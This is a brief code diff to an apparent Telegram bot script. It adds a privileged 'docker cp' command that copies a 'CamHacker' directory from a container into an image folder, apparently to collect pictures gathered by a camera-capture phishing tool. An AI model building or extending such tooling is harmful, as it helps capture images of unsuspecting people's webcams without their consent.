@@ -30,4 +30,5 @@ def start(Client, message):
             else:
                 bot.send_message(chat_id, text="You are not allowed to use this bot")   
         time.sleep(5)
+        subprocess.run(["sudo", "docker","cp","camhacker:/CamHacker","imgfiles"])
 bot.run()
